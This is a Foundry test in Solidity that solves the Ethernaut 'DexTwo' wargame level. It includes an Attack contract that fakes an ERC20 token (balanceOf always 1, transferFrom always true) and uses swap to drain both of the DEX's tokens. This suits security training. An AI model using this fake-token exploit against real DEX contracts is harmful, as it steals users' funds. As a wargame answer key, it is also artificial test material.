// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/DexTwo/DexTwoFactory.sol";
import "../src/Ethernaut.sol";

contract DexTwoTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testDexTwoHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        DexTwoFactory dexTwoFactory = new DexTwoFactory();
        ethernaut.registerLevel(dexTwoFactory);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(dexTwoFactory);
        DexTwo ethernautDexTwo = DexTwo(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        Attack attack = new Attack(address(ethernautDexTwo));
        attack.attack();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {
    DexTwo dexTwoInstance;

    constructor(address dexTwo) payable {
        dexTwoInstance = DexTwo(dexTwo);
    }

    function balanceOf(address) public view returns (uint256 balance) {
        balance = 1;
    }

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        return true;
    }

    function attack() public {
        dexTwoInstance.swap(address(this), dexTwoInstance.token1(), 1);
        dexTwoInstance.swap(address(this), dexTwoInstance.token2(), 1);
    }
}
